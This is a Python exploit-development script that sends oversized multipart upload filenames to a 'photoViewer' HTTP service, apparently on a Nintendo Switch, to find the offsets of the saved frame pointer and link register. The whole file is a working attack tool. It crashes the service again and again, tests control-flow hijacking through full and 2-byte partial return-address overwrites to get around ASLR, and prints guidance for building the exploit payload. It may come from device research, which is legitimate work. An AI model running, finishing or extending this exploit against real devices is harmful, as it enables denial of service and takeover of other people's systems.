#!/usr/bin/env python3 -u -I
"""
Find exact saved FP/LR offset in photoViewer multipart overflow.

Known from prior testing:
  - 3972B: alive (all fills)
  - 3973B: crash with 0x41, NOT tested with NULL
  - 3976B: crash with NULL

This script fine-probes NULL fill at 3973, 3974, 3975 to find the exact
byte where even NULL causes a crash. That's likely the start of saved FP.

Then tests controlled FP/LR overwrite at the discovered offsets.
"""

import socket
import struct
import time
import json
import os
import sys
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = 'wlp5s0'
HTTP_TARGET = '192.168.0.1'
HTTP_PORT = 80
EVIDENCE_DIR = str(_LDN_ROOT / 'evidence' / 'exploit_dev')


def build_multipart_request(filename_bytes):
    boundary = b'----TestBoundary9876'
    body = (b'------TestBoundary9876\r\n'
            b'Content-Disposition: form-data; name="file"; filename="'
            + filename_bytes + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n'
            b'TESTDATA\r\n'
            b'------TestBoundary9876--\r\n')
    req = (b'POST / HTTP/1.1\r\n'
           b'Host: 192.168.0.1\r\n'
           b'Content-Type: multipart/form-data; boundary=----TestBoundary9876\r\n'
           b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
           b'\r\n' + body)
    return req


def send_test(filename_bytes, timeout=5):
    req = build_multipart_request(filename_bytes)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(req)
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return resp
    except Exception:
        return b''


def check_http(timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.setsockopt(socket.SOL_SOCKET, 25, b'wlp5s0\0')
        s.connect((HTTP_TARGET, HTTP_PORT))
        s.sendall(b'GET /data.json HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        resp = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        s.close()
        return b'200 OK' in resp
    except Exception:
        return False


def wait_recovery(max_wait=180):
    t0 = time.monotonic()
    print(f"    Recovering... ", end='', flush=True)
    for _ in range(max_wait * 2):
        time.sleep(0.5)
        if check_http(timeout=2):
            elapsed = round(time.monotonic() - t0, 1)
            print(f"{elapsed}s")
            return elapsed
    print(f"TIMEOUT ({max_wait}s)")
    return None


def test(label, filename_bytes):
    if not check_http():
        rec = wait_recovery()
        if rec is None:
            return None
        time.sleep(1)

    print(f"  [{label}] {len(filename_bytes)}B... ", end='', flush=True)
    resp = send_test(filename_bytes)
    time.sleep(0.5)
    alive = check_http()

    if alive:
        print(f"alive ({len(resp)}B)")
    else:
        print("CRASH")
        rec = wait_recovery()
        if rec is None:
            return None

    return alive


def main():
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    if not check_http():
        print("HTTP down. Start Send to Smartphone on the Switch.")
        sys.exit(1)

    print("=" * 64)
    print("  FIND SAVED FP/LR OFFSET")
    print("=" * 64)
    print()
    print("Known: 3972 NULL=alive, 3976 NULL=crash")
    print("Testing: 3973, 3974, 3975 with NULL fill")
    print()

    results = {}

    # Phase 1: Fine probe NULL fill 3973-3975
    print("[Phase 1] NULL fill fine probe")
    null_crash_at = None
    for size in [3973, 3974, 3975]:
        alive = test(f'null_{size}', b'\x00' * size)
        if alive is None:
            print("  No recovery, aborting.")
            sys.exit(1)
        results[f'null_{size}'] = alive
        if not alive and null_crash_at is None:
            null_crash_at = size

    if null_crash_at is None:
        # All survived — crash is at 3976 with NULL
        null_crash_at = 3976
        print(f"  → NULL survives to 3975B, crashes at 3976B")
    else:
        print(f"  → NULL crash boundary: {null_crash_at}B")

    print()

    # Analysis: what's between the buffer and saved FP?
    # Buffer ends at 3972 (last safe byte for all fills)
    # 0x41 crashes at 3973 (1 byte of local var corrupted)
    # NULL crash at null_crash_at
    gap = null_crash_at - 3972
    print(f"  Buffer end: 3972")
    print(f"  Local vars: bytes 3972-{null_crash_at - 1} ({gap}B, tolerates NULL)")
    print(f"  Saved FP:   bytes {null_crash_at}-{null_crash_at + 7} (hypothesis)")
    print(f"  Saved LR:   bytes {null_crash_at + 8}-{null_crash_at + 15} (hypothesis)")
    print()

    fp_off = null_crash_at
    lr_off = fp_off + 8

    # Phase 2: Verify FP/LR by testing with safe padding through locals
    # Fill buffer with 0x41, locals with 0x00, then test FP overwrite
    print(f"[Phase 2] Controlled FP overwrite at byte {fp_off}")

    # Test A: safe pad through locals, then 1 byte of FP
    fname = b'\x41' * 3972 + b'\x00' * gap + b'\x41'
    alive = test('fp_byte0_41', fname)
    results['fp_byte0_41'] = alive

    # Test B: safe pad, FP = all zeros (8 bytes)
    fname = b'\x41' * 3972 + b'\x00' * gap + b'\x00' * 8
    alive = test('fp_all_zero', fname)
    results['fp_all_zero'] = alive

    if alive:
        print(f"  → FP=0x0 SURVIVES! FP is at byte {fp_off}")
    else:
        print(f"  → FP=0x0 crashes (expected — dereferenced by caller)")
    print()

    # Phase 3: Overwrite LR
    print(f"[Phase 3] Controlled LR overwrite at byte {lr_off}")

    # Test A: safe pad + locals + FP=0 + LR=0 (full 8 bytes)
    # LR=0 should crash from jumping to address 0
    fname = b'\x41' * 3972 + b'\x00' * gap + b'\x00' * 8 + b'\x00' * 8
    alive = test('lr_all_zero', fname)
    results['lr_all_zero'] = alive

    # Test B: safe pad + locals + FP=0 + LR=0x4141414141414141
    # Should crash from jumping to 0x4141414141414141
    fname = b'\x41' * 3972 + b'\x00' * gap + b'\x00' * 8 + b'\x41' * 8
    alive = test('lr_all_41', fname)
    results['lr_all_41'] = alive

    # Test C: 2-byte partial overwrite — only LR low 2 bytes
    # This preserves the upper 6 bytes of original LR (ASLR slide)
    # and redirects within a 64KB window
    fname = b'\x41' * 3972 + b'\x00' * gap + b'\x00' * 8 + b'\x42\x42'
    alive = test('lr_partial_4242', fname)
    results['lr_partial_4242'] = alive

    # Test D: 2-byte partial with different value
    fname = b'\x41' * 3972 + b'\x00' * gap + b'\x00' * 8 + b'\x00\x00'
    alive = test('lr_partial_0000', fname)
    results['lr_partial_0000'] = alive

    print()

    # Save evidence
    path = f"{EVIDENCE_DIR}/fp_lr_find_{int(time.time())}.json"
    with open(path, 'w') as f:
        json.dump({
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
            'buffer_end': 3972,
            'null_crash_at': null_crash_at,
            'fp_offset': fp_off,
            'lr_offset': lr_off,
            'results': {k: v for k, v in results.items()},
        }, f, indent=2)
    print(f"Evidence: {path}")

    # Summary
    print()
    print("=" * 64)
    print("  SUMMARY")
    print("=" * 64)
    print(f"  Buffer overflow start: byte 3972")
    print(f"  NULL crash boundary:   byte {null_crash_at}")
    print(f"  Local vars gap:        {gap} bytes (3972-{null_crash_at-1})")
    print(f"  Saved FP offset:       {fp_off} (hypothesis)")
    print(f"  Saved LR offset:       {lr_off} (hypothesis)")
    print()
    print("  Test results:")
    for k, v in results.items():
        status = 'alive' if v else 'CRASH' if v is not None else 'SKIP'
        print(f"    {k:25s} {status}")

    # Exploitation guidance
    print()
    print("  For 2-byte partial LR overwrite:")
    print(f"    filename = 'A' * 3972 + '\\x00' * {gap} + '\\x00' * 8 + <LR_LOW_2>")
    print(f"    Total filename length: {lr_off + 2} bytes")


if __name__ == '__main__':
    main()
